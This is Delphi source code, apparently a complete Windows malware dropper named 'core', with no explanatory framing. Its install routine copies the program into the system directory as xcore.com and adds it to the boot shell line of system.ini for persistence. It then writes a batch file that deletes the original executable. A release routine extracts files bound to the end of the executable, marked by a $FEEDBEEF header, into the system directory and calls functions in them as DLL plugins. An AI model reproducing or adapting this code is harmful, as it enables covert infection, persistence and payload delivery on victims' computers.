   program core;

   uses
     Windows;

   Type
   TAttachmentHeader = record
     MagicNumber: cardinal;
     CRC: cardinal;
     Size: int64;
     IsStub: boolean;
     FileName: array[0..MAX_PATH] of char;
   end;
   PAttachmentHeader = ^TAttachmentHeader;
   type
   ARGTYPE = (ARG_NONE = -1,
   ARG_UI1 = 0, ARG_I1,
   ARG_UI2, ARG_I2,
   ARG_UI4, ARG_I4,
   ARG_R4, ARG_PUI1,
   ARG_PI1, ARG_PUI2,
   ARG_PI2, ARG_PUI4,
   ARG_PI4, ARG_PR4);
   type
   DLL_ARG = record
   case eType: ARGTYPE of
     ARG_UI1: (ucVal: PChar);
     ARG_PUI1: (pucVal: PChar);
     ARG_I1: (cVal: ShortInt);
     ARG_PI1: (pcVal: ^ShortInt);
     ARG_UI2: (usVal: Word);
     ARG_PUI2: (pusVal: ^Word);
     ARG_I2: (sVal: SmallInt);
     ARG_PI2: (psVal: ^SmallInt);
     ARG_UI4: (ulVal: Longword);
     ARG_PUI4: (pulVal: ^Longword);
     ARG_I4: (lVal: Integer);
     ARG_PI4: (plVal: ^Integer);
     ARG_R4: (fltVal: Single);
     ARG_PR4: (pfltVal: ^Single);
   end;

   Const
     fmOpenRead                          = $0000;
     fmOpenWrite                         = $0001;
     fmOpenReadWrite                     = $0002;
     fmShareCompat                       = $0000;
     fmShareExclusive                    = $0010;
     fmShareDenyWrite                    = $0020;
     fmShareDenyRead                     = $0030;
     fmShareDenyNone                     = $0040;
     FILE_ATTRIBUTE_READONLY             = $00000001;
     FILE_ATTRIBUTE_HIDDEN               = $00000002;
     FILE_ATTRIBUTE_SYSTEM               = $00000004;
     FILE_ATTRIBUTE_VOLUMEID             = $00000008;
     FILE_ATTRIBUTE_ARCHIVE              = $00000020;
     FILE_ATTRIBUTE_DIRECTORY            = $00000010;
     FILE_ATTRIBUTE_ANYFILE              = $0000003F;

   function CallDLLByName(szLibrary, szFunction: PChar; Arguments: array of DLL_ARG; nArgCount: Integer; var pRetVal: DLL_ARG): Integer; cdecl; //Returns error code
   var
   pFun: Integer;
   dwTemp: Longword;
   dwRet: Longword;
   i: Integer;
   m_hDLL: Integer;
   Begin
     pFun := 0;
     dwRet := 0;
     m_hDLL := 0;
     m_hDLL := LoadLibrary(szLibrary);
     if m_hDLL = 0 then
     Begin
       Result := 1;
       exit;
     end;
     pFun := Integer(GetProcAddress(m_hDLL, szFunction));
     if pFun <> 0 then
     Begin
       for i := High(Arguments) downto Low(Arguments) do
       Begin
         CopyMemory(@dwTemp, @Arguments[i].lVal, SizeOf(Longword));
       asm push dwTemp end;
     end;
     if pRetVal.eType = ARG_R4 then
     Begin
       asm
       call dword ptr [pFun]
       fstp dword ptr [dwRet]
     end;
     end
     else
     Begin
       asm
       call dword ptr [pFun]
       mov dword ptr [dwRet], eax
     end;
   end;

   for i := Low(Arguments) to High(Arguments) do
   Begin
   asm pop dwTemp end;
   Try
     CopyMemory(@Arguments[i].cVal, @dwTemp, SizeOf(Longword));
   Except
     Exit;
   End;
   end;
   if pRetVal.eType <> ARG_NONE then
   Begin
     pRetVal.eType := ARG_I4;
     pRetVal.lVal := dwRet;
   end;
   end
   else
   Begin
     Result := 2;
     exit;
   end;
   Result := 0;
   end;

   procedure DoPlugin(DLL,Name:String; Args: Array of DLL_ARG);
   var
   GetRet: DLL_ARG;
   buf: PChar;
   begin
     CallDLLByName(pChar(DLL), pChar(Name), Args, High(Args), GetRet);
   end;

   Procedure DoInstall;
   Var
     wDir: Array[0..256]of Char;
     wName: String;
     wBat: TextFile;
   Begin
     If CreateMutex(NIL, FALSE, 'corex10') = ERROR_ALREADY_EXISTS
     Then ExitProcess(0);

     GetSystemDirectory(wDir, 256);
     wName := String(wDir) + '\xcore.com';

     If ParamStr(0) <> wName Then
     Begin
     Try
       DeleteFile(pChar(wName));
     Except
       ;
     End;
       CopyFile(pChar(ParamStr(0)), pChar(wName), False);

       WritePrivateProfileString('boot','shell','Explorer.Exe xcore.com', 'system.ini');

       AssignFile(wBat, 'c:\xcore.bat');
       ReWrite(wBat);
       WriteLn(wBat, 'del "'+ParamStr(0)+'"');
       WriteLn(wBat, 'del C:\xcore.bat');
       CloseFile(wBat);

       WinExec(pChar(wName), 1);
       WinExec('c:\xcore.bat', 0);
       ExitProcess(0);
     End;
   End;

   function FileOpen(const FileName: string; Mode: LongWord): Integer;
   const
     AccessMode: array[0..2] of LongWord = (
     GENERIC_READ,
     GENERIC_WRITE,
     GENERIC_READ or GENERIC_WRITE);
     ShareMode: array[0..4] of LongWord = (
     0,
     0,
     FILE_SHARE_READ,
     FILE_SHARE_WRITE,
     FILE_SHARE_READ or FILE_SHARE_WRITE);
   begin
     Result := Integer(CreateFileA(PChar(FileName), AccessMode[Mode and 3],
     ShareMode[(Mode and $F0) shr 4], nil, OPEN_EXISTING,
     FILE_ATTRIBUTE_NORMAL, 0));
   end;

   function FileCreate(const FileName: string): Integer;
   begin
     Result := Integer(CreateFileA(PChar(FileName), GENERIC_READ or GENERIC_WRITE,
     0, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0));
   end;

   procedure FileClose(Handle: Integer);
   begin
     CloseHandle(THandle(Handle));
   end;

   function FileExists(const FileName: string): Boolean;
   var
   lpFindFileData: TWin32FindData;
   hFile: Cardinal;
   begin
     hFile := FindFirstFile(PChar(FileName), lpFindFileData);
     if hFile <> INVALID_HANDLE_VALUE then
     begin
       result := True;
       Windows.FindClose(hFile)
     end
     else
       result := False;
   end;

   Procedure DoRelease;
   var
     buffer: array[0..$ffff] of byte;
     fSource, fTemp: THandle;
     BytesRead, BytesWritten: cardinal;
     NeededSize, BufferRead: cardinal;
     tmppath, fname, tname: string;
     Header: TAttachmentHeader;
     wDir: Array[0..256]of Char;
     Plugin:Boolean;
     Args: array[0..3] of DLL_ARG;
     Das_Cool:String;
   begin
     GetSystemDirectory(wDir, 256);
     TmpPath := wDir;
     Try

       FSource := FileOpen(ParamStr(0), fmOpenRead or fmShareDenyWrite);
       If FSource = THandle(-1) Then
       Begin

         Exit;
       End;
       Try
         SetFilePointer(FSource, GetFileSize(FSource, NIL) - SizeOf(TAttachmentHeader), NIL, FILE_BEGIN);
         ReadFile(FSource, Header, SizeOf(Header), BytesRead, NIL);
         if (Header.MagicNumber <> $FEEDBEEF) or (BytesRead <> SizeOf(Header)) Then
         Begin
           FileClose(FSource);

           Exit;
         End;

         SetFilePointer(FSource, Header.Size, NIL, FILE_BEGIN);
         While (SetFilePointer(FSource, 0, NIL, FILE_CURRENT) <= (GetFileSize(FSource, NIL) - SizeOf(Header))) Do
         Begin
           ReadFile(FSource, Header, SizeOf(Header), BytesRead, NIL);
           If Header.MagicNumber <> $FEEDBEEF Then
           Begin

             Exit;
           End;

           FName := Header.FileName;
           Repeat
             Str(GetTickCount, TName);
             Fname := Header.FileName;
             Sleep(0);
           Until Not FileExists(TmpPath+Fname);
           Plugin := false;
           If Copy(fName, 1, 1)= '1' Then
             Plugin := True Else
             Plugin := false;
           fName := Copy(fName, 2, Length(fName));
           Das_Cool := Copy(fName, Pos(';', fName)+1, Length(fName));
           fName := Copy(fName, 1, Pos(';', fName)-1);
           fTemp := FileCreate(TmpPath + Fname);

           NeededSize := Header.Size;
           Repeat
             If NeededSize > SizeOf(Buffer) Then
               BufferRead := SizeOf(Buffer)
             Else
               BufferRead := NeededSize;
             ReadFile(FSource, Buffer, BufferRead, BytesRead, NIL);
             WriteFile(FTemp, Buffer, BytesRead, BytesWritten, NIL);
             Dec(NeededSize, BytesRead);
           Until (BytesRead <> BufferRead) Or (NeededSize = 0);
           FileClose(FTemp);

           Args[0].eType := ARG_UI4;
           If Plugin Then DoPlugin(TmpPath + Fname, Das_Cool, Args);
           If (NeededSize <> 0) {Or (Not SpawnProgram(TmpPath + Fname))} Then
           Begin

             FileClose(FSource);
             Exit;
           End;
         End;
         FileClose(FSource);
         Finally
           End;
       Finally
         End;
   End;

   begin
     DoInstall;
     DoRelease;
     ExitProcess(0);
   end.
